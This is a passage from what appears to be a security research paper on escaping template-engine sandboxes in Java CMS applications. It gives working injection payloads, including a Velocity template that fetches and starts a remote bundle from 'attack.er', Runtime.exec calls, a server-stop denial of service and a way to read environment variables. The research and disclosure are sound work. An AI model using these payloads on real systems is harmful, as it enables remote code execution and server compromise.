servlet among others. In the following section, we will analyze some of the most interesting
RCE-leading objects we found in the template contexts of these ten analyzed CMS applications. 
Hazardous objects 
ClassLoaders 
We found instances of ​java.lang.ClassLoader in all of the analyzed applications. We can
normally get an instance by using any of the following methods: 
●
java.lang.Class.getClassLoader() 
●
java.lang.Thread.getCurrentClassLoader() 
●
java.lang.ProtectionDomain.getClassLoader() 
●
javax.servlet.ServletContext.getClassLoader() 
●
org.osgi.framework.wiring.BundleWiring.getClassLoader() 
●
org.springframework.context.ApplicationContext.getClassLoader()  
Even though the first two are normally blocked on most sandboxes, ProtectionDomain and
ServletContext ones are normally not blocked. For example:  
${​any_object​.class.classLoader} 
${request.servletContext.classLoader} 
Getting access to a Java ClassLoader allows us to load arbitrary classes or classpath resources
managed by that ClassLoader. The former is interesting because it is normally required to
instantiate arbitrary types, and the latter enables us to download application configuration files
and even the application JAR files. 
In addition to classpath resources, we can also use the ClassLoader instance to read arbitrary
files from the file system (under the same permissions as the application server) by using the
getResource() method to get an instance of ​java.net.URL and then turn it into a URI
pointing to the desired file. After that, we can turn it back into a URL and read its contents by
opening a connection to that URL: 
${bytes} 
Web Application ClassLoaders 
Because CMS applications are deployed on top of Servlet Containers and Application Servers,
the ClassLoader we can access might be an instance of a Web Application ClassLoader. 
Web Application ClassLoaders extend from java.lang.ClassLoader​, but define additional
methods to manage the way class loading works on application servers that normally use a
delegation model different fromthe one used by standard ClassLoaders. We found these
ClassLoaders in nine out of the ten applications we analyzed so we took a look at the additional
methods exposed to determine if we could get arbitrary code execution and found the following
vectors: 
Tomcat​ ​(​org.apache.catalina.loader.WebappClassLoader​) 
The
ClassLoader’s
​getResources​()
method
gives
us
access
to
an
instance
of
WebResourceRoot​ that exposes some additional methods, including: 
write​(​String​ path, ​InputStream​ is, boolean overwrite) 
Creates a new file at the requested path using the provided InputStream allowing us to upload
a webshell. 
getContext​()  
Gives us access to the Tomcat​ ​context​ that in turn exposes: 
getInstanceManager​()  
Which, as we will see in the following section, allows us to instantiate arbitrary objects. 
Jetty​ ​(​org.eclipse.jetty.webapp.WebAppClassLoader​) 
Jetty ClassLoader exposes​ ​getContext​()​ that gives us access to an instance of 
WebAppContext​ that exposes:  
getObjectFactory​() 
This method allows us to instantiate arbitrary types as shown in the following section. 
GlassFish​ ​(​org.glassfish.web.loader.WebappClassLoader​) 
The ClassLoader​ ​getResources​()​ method returns an instance of 
javax.naming.directory.DirContext that exposes some methods to perform JNDI lookups such as: 
lookup​(​String​ name) 
Check ​our BlackHat 2016 presentation about JNDI injection attacks to learn how to perform
these attacks. 
WebLogic​ ​(weblogic.utils.classloaders.GenericClassLoader) 
This ClassLoader exposes the following method: 
defineCodeGenClass​(​String​ className, byte[] bytes, ​URL​ codebase)) 
It allows us to define, load and initialize arbitrary classes from an array of bytes. An attacker
can provide a custom class with a payload embedded in the class static initializer to execute
arbitrary code. 
WebSphere​ ​(com.ibm.ws.classloader.CompoundClassLoader) 
Similar to the WebLogic ClassLoader, the ClassLoader exposes: 
defineApplicationClass​(​String ​className​,​ byte[]​ ​bytecode)  
Allows an attacker to define and load an arbitrary custom class with a malicious static
initializer. However, in this case the class is not initialized so attackers require an additional
step to initialize the class, for example: instantiate it, access a static method or field or load it
with ​java.lang.Class.forName(string, ​true​, ClassLoader)​.  
Tomcat, Jetty, GlassFish​ ​(​java.net.URLClassLoader​) 
In
addition
any
ClassLoader
extending from ​java.net.URLClassLoader contains the
following static method: 
newInstance​(​URL​[] ​urls​) 
This method allows the attacker to initialize the ClassLoader pointing to their own JAR file.
Any additional class loading on that ClassLoader tries to resolve the class from the
attacker-controlled
JAR
file.
As
in
the
WebSphere
case,
newInstance(attacker-url).loadClass(⋯​)
allows
us
to
define and load arbitrary
classes, but not to instantiate them.  
Instance Managers 
The second most common objects that can be used to bypass the sandbox and achieve
arbitrary code execution are the ones known as Instance Managers or Object Factories. These
enable us to instantiate arbitrary classes. These are normally used by Servlets to instantiate
filters and other servlets and therefore they are normally found in the Servlet context under
attributes such as: 
●
org.apache.catalina.InstanceManager 
●
org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManager 
●
org.eclipse.jetty.util.DecoratedObjectFactory 
As we saw in the previous section, they can sometimes be accessed through Web Application
ClassLoaders. For example: 
Tomcat 
$request.servletContext.classLoader​.​resources​.​context​.​instanceManager 
Jetty 
$request.servletContext.classLoader​.​context​.​objectFactory 
Once we are able to access an Instance Manager, we can instantiate arbitrary types. There are
a number of classes that we can use to execute arbitrary Java code or System commands,
including the ScriptEngineManager class: 
${im.newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eva
l(​'CODE'​)} 
Spring Application Context 
The Top #3 object we can use to escape the sandbox are the Spring framework Contexts.
These will obviously be only available when the Spring Framework is used, but that was the
case in four out of the ten CMS applications we analyzed so it is a plausible vector. 
Spring
framework
Contexts
​provide
an
advanced configuration mechanism capable of
managing beans (objects) of any nature, using potentially any kind of storage facility.  
The ​ApplicationContext builds on top of the ​BeanFactory (it is a subclass) that provides an
advanced configuration mechanism capable of managing beans (objects) of any nature. It also
adds other functionality such as easier integration with Springs AOP features, message
resource handling (for use in internationalization), event propagation, declarative mechanisms
to create the ApplicationContext and optional parent contexts, and application-layer specific
contexts such as the WebApplicationContext. 
We
can
normally
access
the
Root
application
context
under
the
org.springframework.web.context.WebApplicationContext.ROOT attribute, but other
Application Contexts might also be exposed. 
In addition, the Spring MVC ​AbstractTemplateView exposes a ​RequestContext object to
the Template Context regardless of the template engine used. ​This object is exposed under the
springMacroRequestContext name. Amongst other methods, the RequestContext exposes a
getWebApplicationContext​() method, which returns the current WebApplicationContext.
Therefore, we can also access the Spring Web Application Context using the following object
chain on applications using Spring MVC Template views: 
${springMacroRequestContext.webApplicationContext} 
Lastly, some template engines such as Pebble might ​expose all the Spring Beans as part of
their Spring integration. 
After we have access to the Spring Application Context, we can perform a number of different
attacks: 
getClassLoader()  
This method returns a ClassLoader instance that we can use to start a ClassLoader-based
attack as mentioned in the previous sections.  
getServletContext() 
This method returns an instance of the ServletContext from which we can obtain new objects
such as Instance Managers.  
getWebServer() 
This method gives us access to the Web Server and enables us to stop it as part of a Denial
Of Service attack. For example: 
${Application['org.springframework.web.context.WebApplicationContext.ROO
T'].getWebServer().stop()}  
getEnvironment() 
This method gives us access to the system properties and environment variables: 
Application['org.springframework.web.context.WebApplicationContext.ROOT'
].environment.systemProperties 
Application['org.springframework.web.context.WebApplicationContext.ROOT'
].environment.systemEnvironment  
getBeanFactory()​ /​ ​getBean​(​String name​) 
These methods give us access to all Spring Beans (objects) registered in the Application
Context. This is probably the most interesting vector since most of these objects are service
beans that enable us to control the application logic by creating/deleting users, creating
transactions, etc.  
Depending on the beans we can access, we can even disable the engine sandbox as we will
see later or instantiate arbitrary objects by using JSON/XML unmarshallers: 
${​mapper.enableDefaultTyping().readValue("{}",smc).getEngineByName('js').eval(
'CODE'​)​} 
We can list all the Spring Beans and their types. For example, in FreeMarker:  
${item} - 
${ctx.webApplicationContext.getBeanDefinition(item).beanClass} 
no class 
Thread 
Sometimes found as a Request attribute, ​java.lang.Thread gives access to the current
thread enabling us to suspend it or stop it. It also gives us access to the Context ClassLoader
through the following method: 
getContextClassLoader​() 
By accessing the current thread ClassLoader, we can start a ClassLoader-based attack as
explained in previous sections.  
Tomcat WebResourceRoot 
Tomcat’s Web resources represent the complete set of resources for a web application. We
have
already
discussed
Tomcat’s
​WebResourceRoot
as
part
of the Web Application
ClassLoader section, however, it is interesting to note that it can also be found as a
ServletContext attribute under the org.apache.catalina.resources key. In addition to the
write()​ and ​getContext()​ methods, there are some other interesting methods:  
getBaseUrls​() 
It returns an array of java.net.URL that we can use to read arbitrary files from the file system
as mentioned earlier.  
mkdir​(​java.lang.String path​) 
Create a new directory at the given path. 
OSGI Bundle Context 
OSGi Bundle Execution Contexts were found in two of the analyzed CMS applications and offer
an interesting RCE vector by loading remote Bundles and starting them, effectively running the
attacker-controlled Bundle’s  
org.osgi.framework.BundleActivator.​start​(BundleContext
 context) method. For
example, the following Velocity template loads a remote bundle from attack.er domain and
starts it, effectively executing the payload stored in the​ ​start​ method: 
#set($location = "​https://attack.er/pwnbundle.jar​" ) 
#set($bundleAttr = "org.osgi.framework.BundleContext" ) 
#set($servletContext = $request.servletContext() ) 
#set($bundleContext = $servletContext.getAttribute($bundleAttr) ) 
#set($bundle = ​$bundleContext.installBundle($location)​ ) 
$bundle.getBundleId() 
$bundle.getSymbolicName() 
$bundle.getState() 
​$bundle.start(3)​ 
$bundle.getState() 
$bundle.uninstall() 
JSON/XML Unmarshallers 
Unmarshallers are a quick and easy way for us to get arbitrary classes instantiated. We can
achieve this by unmarshalling an empty JSON object of a specified type. The following example
uses an example from Liferay, which exposed a JSON utility object called​ jsonFactoryUtil​: 
In a different example from Liferay, we obtained a different JSON Unmarshaller from the Spring
Application Context: 
Even though it might look similar to the previous example, this one has an important advantage.
Class is specified as a String rather than a Class object, so a ClassLoader access is not a
requirement. In this particular case, the deserializer uses an allowlist to prevent the use of
arbitrary types, but we can access it and register our own classes. 
Struts Action 
In some cases, we can get access to the Struts Action handling the request. These were directly
exposed to the Template Context (for example, ​$context​) or were available in the request
attributes
(for
example,
$req.getAttribute('view.page.action.helper').getAction()​).
If
the
​Action
extends from ActionSupport​, we can get arbitrary code execution by injecting arbitrary OGNL
expressions using the following method: 
getText​(​String​ aTextName) 
This method pre-evaluates the argument as an OGNL Injection:  
$action.getText("foo","${@java.lang.Runtime@getRuntime().exec('touch 
/tmp/pwned')}", null) 
Struts OgnlValueStack 
In the same CMS, we also accessed an instance of the OgnlValueStack class in a couple of
ways: 
●
Directly exposed to the context, such as: ​$stack 
●
$req.getAttribute('webwork.valueStack') 
●
$application.getAttribute('com.opensymphony.xwork.DefaultActionInvoc
ation').getStack() 
After we get an instance of the Value Stack we can access the ​findValue​ method: 
findValue​(​String​ expr) 
Find a value by evaluating the given expression against the stack in the default search order. 
$stack.findValue("@java.lang.Runtime@getRuntime().exec('touch 
/tmp/pwned')") 
Struts DefaultActionInvocation 
Similarly,
we
accessed
an
instance
of
Struts
​DefaultActionInvocation
from
the
ServletContext. This class contains a few interesting methods: 
getAction​() 
Get the Action associated with this ActionInvocation. See “Struts Action” section 
getStack​() 
Gets the ValueStack associated with this ActionInvocation. See “Struts OgnlValueStack” 
There are other interesting methods that can lead to OGNL injection. 
Struts OgnlTool 
We also found an instance of  ​OgnlTool​ that exposes the ​findValue​()​ method: 
findValue​(​String​ expr, ​Object​ context)  
Evaluate arbitrary OGNL expressions 
VelocityWebWorkUtil 
We found a ​VelocityWebWorkUtil object in one of the analyzed CMS applications. It led to
an interesting bypass because it exposes the following method: 
evaluate​(​String ​expression) 
This method gets an unsandboxed instance of the Velocity evaluator, so we can use it to run
plain payloads. For example: 
$webwork.evaluate("\#set( $v = '') 
$v.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invok
e(null,null).exec('touch /tmp/pwned_webwork')") 
FreeMarker StaticModels 
In one of the analyzed CMS applications, we found that even though the developers enabled
the sandbox and disabled the new built-in, they exposed FreeMarker StaticModels. This
TemplateModel enables access to static fields and methods from arbitrary classes, effectively
leading to RCE in multiple ways. This object is not exposed by default though. To expose it,
developers normally do something along the lines of: 
model.addAttribute("statics", new DefaultObjectWrapperBuilder(new 
Version("2.3.30")).build().getStaticModels()); 
Or globally 
TemplateHashModel staticModels = wrapper.getStaticModels(); 
newConfig.setSharedVariable("statics", staticModels); 
When exposed, static methods can be accessed in the following way: 
$statics["com.sun.org.apache.xerces.internal.utils.ObjectFactory"].newInstance
("javax.script.ScriptEngineManager",true) 